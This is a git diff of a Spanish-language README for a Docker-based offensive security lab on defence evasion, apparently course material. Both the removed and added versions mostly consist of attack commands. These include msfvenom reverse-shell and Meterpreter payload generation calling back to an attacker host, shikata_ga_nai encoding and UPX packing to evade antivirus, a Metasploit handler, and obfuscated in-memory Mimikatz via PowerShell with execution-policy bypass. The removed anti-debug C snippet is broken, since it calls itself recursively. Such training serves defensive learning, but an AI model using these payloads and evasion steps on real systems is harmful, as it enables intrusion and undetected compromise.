@@ -1,125 +1,91 @@
-# Unit 6 - Evasión de Defensas
+# 🦸 Unit 6: Evasión de Defensas - LAB PRÁCTICO
 
-## Objectives
+## 🎯 Objetivos
 
-1. Learn evasion techniques to bypass security systems
-2. Understand signature-based defense evasion
-3. Master behavioral analysis evasion
-4. Learn anti-debugging and anti-VM techniques
-5. Understand modern defense mechanisms
+Practicar **técnicas de evasión**:
 
-## Tools Included
+1. **Obfuscación de payloads** - Evadir AV
+2. **Encoding** - Codificar payloads
+3. **Anti-debug** - Evadir análisis
+4. **Evasión de firewalls**
 
-- **Kali Linux**: Penetration testing distribution
-- **Veil-Evasion**: Payload obfuscation
-- **Meterpreter**: Advanced payload
-- **Covenant**: Command and control
-- **Powershell Empire**: PowerShell C2
+---
 
-## Lab Setup
+## 🏗️ Arquitectura
 
-### Build and Start Containers
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                      LABORATORIO 6                                │
+│                    EVASIÓN DE DEFENSAS                              │
+├──────────────────────────────────────────────────────────────────┤
+│   ┌─────────────┐                            ┌─────────────┐      │
+│   │    KALI    │        ATAQUE              │  OBJETIVO  │      │
+│   │   LINUX    │  ──────────────────────→    │   WINDOWS  │      │
+│   │ (Atacante) │                            │             │      │
+│   └─────────────┘                            └─────────────┘      │
+│        │                                            │              │
+│        │  • msfvenom                                │              │
+│        │  • UPX                                  │              │
+│        │  • Veil                                 │              │
+│        │            RED: 192.168.61.0/24        │              │
+└────────┼──────────────────────────────────────────┼──────────────┘
+         │
+    SSH:2222
+```
+
+---
+
+## 🚀 Iniciar
 
 ```bash
 cd docker-labs/unit6
 docker-compose up -d
 ```
 
-### Access the Lab
+---
 
-1. **Web Interface**: http://localhost:8085 (Kali Desktop via noVNC)
-2. **SSH Access**:
-   ```bash
-   ssh root@localhost -p 2227
-   Password: toor
-   ```
+## ⚔️ EJERCICIOS DE ATAQUE
 
-### Stop and Cleanup
+### Ejercicio 1: Generar Payload
 
 ```bash
-cd docker-labs/unit6
-docker-compose down
+ssh root@localhost -p 2222
 
-# Remove volumes (deletes all data)
-docker-compose down -v
+# Payload básico
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.x LPORT=4444 -f elf -o shell.elf
+
+# Ver detección
+file shell.elf
 ```
 
-## Lab Exercises
+### Ejercicio 2: Ofuscación con UPX
 
-### Exercise 1: Payload Obfuscation with Veil
-
-1. Generate obfuscated payload:
-   ```bash
-   veil
-   use evasion/hta_attack
-   set LHOST 192.168.0.106
-   set LPORT 4444
-   generate
-   ```
-
-2. Deliver and execute the payload:
-   ```bash
-   python3 -m http.server 80
-   ```
-
-### Exercise 2: Meterpreter Evasion
-
-1. Generate advanced Meterpreter payload:
-   ```bash
-   msfvenom -p windows/meterpreter/reverse_https \
-     LHOST=192.168.0.106 LPORT=4443 \
-     -e x86/shikata_ga_nai -i 5 \
-     -f exe -o meterpreter.exe
-   ```
-
-2. Start handler:
-   ```bash
-   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.0.106; set LPORT 4443; run"
-   ```
-
-### Exercise 3: PowerShell Evasion
-
-1. Generate obfuscated PowerShell script:
-   ```bash
-   python3 Invoke-Obfuscation.ps1 -ScriptBlock 'Invoke-Mimikatz' -Command 'Token\All'
-   ```
-
-2. Execute in memory:
-   ```bash
-   powershell -ExecutionPolicy Bypass -EncodedCommand <encoded_script>
-   ```
-
-### Exercise 4: Anti-Analysis Techniques
-
-1. Detect virtualization:
-   ```powershell
-   Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object Manufacturer, Model
-   ```
-
-2. Detect debugging:
-   ```c
-   BOOL IsDebuggerPresent()
-   {
-       return IsDebuggerPresent();
-   }
-   ```
-
-## Resources
-
-- [Veil Framework](https://www.veil-framework.com/)
-- [Meterpreter Documentation](https://docs.metasploit.com/docs/payloads/meterpreter.html)
-- [Covenant C2](https://github.com/cobbr/Covenant)
-- [PowerShell Empire](https://github.com/BC-SECURITY/Empire)
-
-## Troubleshooting
-
-### Payload won't execute
-
-Check antivirus logs on target system
-
-### Connection refused
-
-Verify handler is running on correct port:
 ```bash
-netstat -tuln
+# Comprimir payload
+upx -9 -o shell_packed.elf shell.elf
+
+# Verificar
+ls -lh shell*.elf
+```
+
+### Ejercicio 3: Encoding
+
+```bash
+# XOR encoding
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.x LPORT=4444 -f elf -e x86/shikata_ga_nai -i 5 -o shell_encoded.elf
+```
+
+### Ejercicio 4: Verificar con VirusTotal (simulado)
+
+```bash
+# Hash del payload
+sha256sum shell*.elf
+```
+
+---
+
+## 🛑 Cleanup
+
+```bash
+docker-compose down -v
 ```
